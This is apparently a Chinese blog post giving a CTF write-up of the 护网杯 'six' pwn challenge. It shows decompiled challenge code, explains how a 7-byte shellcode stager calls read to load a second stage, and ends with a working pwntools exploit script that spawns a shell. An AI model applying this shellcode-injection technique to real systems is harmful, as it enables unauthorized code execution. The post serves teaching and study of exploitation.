---
layout:     post
title:      护网杯six题解
subtitle:    护网杯six
date:       2018-10-1
author:     XT
header-img: img/post-bg-coffee.jpeg
catalog: 	 true
tags:
    - pwn
---


> six


# six

源码如图

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void (__fastcall *v3)(__int64, char *); // ST08_8@1
  size_t v4; // rax@1
  char *v5; // rbx@1
  size_t v6; // rax@1
  int result; // eax@1
  __int64 v8; // rcx@1
  char s; // [sp+10h] [bp-20h]@1
  __int64 v10; // [sp+18h] [bp-18h]@1
  v10 = *MK_FP(__FS__, 40LL);
  mmap2();                                      // 分配两块地址
                                                // dest可执行
                                                // fake_stack可写可读
  v3 = dest;                                    // dest地址赋值给v3
  memset(&s, 0, 8uLL);
  puts("Show me your shellcode:");
  read(0, &s, 7uLL);
  check(&s, &s);
  v4 = strlen(src);
  memcpy(dest, src, v4);                        // src传到第一块内存中
  v5 = dest;
  v6 = strlen(src);
  memcpy(&v5[v6], &s, 7uLL);                    // 将用户的输入传到src之后
  v3(fake_stack, &s);                           // v3即调用我们的dest函数，参数为fake_stack
  result = 0;
  v8 = *MK_FP(__FS__, 40LL) ^ v10;
  return result;
}

__int64 mmap2()
{
  int fd; // ST04_4@1
  __int64 buf; // [sp+8h] [bp-18h]@1 //buf低地址
  __int64 v3; // [sp+10h] [bp-10h]@1 //v3高地址
  __int64 v4; // [sp+18h] [bp-8h]@1

  v4 = *MK_FP(__FS__, 40LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  fd = open("/dev/urandom", 0);
  read(fd, &buf, 6uLL);
  read(fd, &v3, 6uLL);
  dest = mmap((v3 & 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7, 34, -1, 0LL);// dest可执行
  fake_stack = mmap((buf & 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 3, 34, -1, 0LL) + 1280;
  return *MK_FP(__FS__, 40LL) ^ v4;
}

__int64 __fastcall check(__int64 a1)
{
  __int64 result; // rax@2
  signed int i; // [sp+18h] [bp-8h]@1
  int j; // [sp+1Ch] [bp-4h]@2

  for ( i = 0; i <= 6; ++i )
  {
    result = (i + 1);
    for ( j = i + 1; j <= 6; ++j )
    {
      result = *(j + a1);
      if ( *(i + a1) == result )
      {
        puts("Invalid shellcode!");
        exit(0);
      }
    }
  }
  return result;
}
```



其中check函数是用来检测我们写的shellcode是不是每个字节相同的。

对于src即我们的shellcode之前的那一段代码，

因为具有可执行性所以我们的代码是

![1545912100040](https://raw.githubusercontent.com/xineting/xineting.github.io/master/img/six.png)

把所有的寄存器都设为了0，并且把rsp指向了第二块申请内存的地址

所以这题的思路是，由于src将各寄存器都置0了，我们可以利用0号系统调用read输入进行第二次的shellcode输入，输入位置可以是rsp栈顶，rax=0表示0号调用read,rdi=0表示标准输入，rsi可以设置为rsp，表示输入到栈顶，rdx表示输入字节大小，这个不固定，只要能过judge就行。然后通过read输入shellcode覆盖这两块内存空间，直到覆盖过rip，最后在尾部加上调用shell的shellcode即可。这里我用nop填充。

最后脚本为

```python
from pwn import *
context(os="linux",arch="amd64",log_level="debug",endian="little")
context.terminal = ['tmux', 'split', '-h']
sh = process("./seven")
#gdb.attach(sh,"b read")
sh.recvuntil("Show me your shellcode:")

payload1 =asm("push rsp;pop rsi;mov edx,esi;syscall")
sh.sendline(payload1)
nop=asm("nop")
shell= asm(shellcraft.sh())

payload2=nop*0xb36+shell
sh.sendline(payload2)
sh.interactive()
```

至于那个长度b36，可以在调试的时候测试出来。

